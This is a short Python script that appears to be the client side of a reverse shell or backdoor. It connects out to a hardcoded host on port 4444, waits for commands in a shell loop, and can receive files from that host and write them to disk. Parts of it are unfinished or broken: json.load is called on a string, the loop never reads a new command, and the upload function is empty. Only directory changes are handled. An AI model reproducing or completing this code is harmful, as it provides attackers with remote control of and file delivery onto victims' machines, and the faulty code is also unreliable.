import socket
import json
import os

def data_recv():
    data = ''
    while True:
        try:
            data = data + soc.recv(1024).decode().rstrip()
            return json.load(data)
        except ValueError:
            continue

def download_file(file):
    f = open(file, 'wb')
    soc.settimeout(5)
    chunk = soc.recv(1024)

    while chunk:
        f.write(chunk)
        try:
            chunk = soc.recv(1024)
        except socket.timeout:
            break
    
    soc.settimeout(None)
    f.close()

def upload_file():
    return

def shell():
    comm = data_recv()
    while True:
        if comm == 'exit':
            break
        elif comm == 'clear':
            pass
        elif comm [:3] == 'cd ':
            os.chdir(comm[3:])

soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
soc.connect(('172.22.163.174', 4444))
shell()

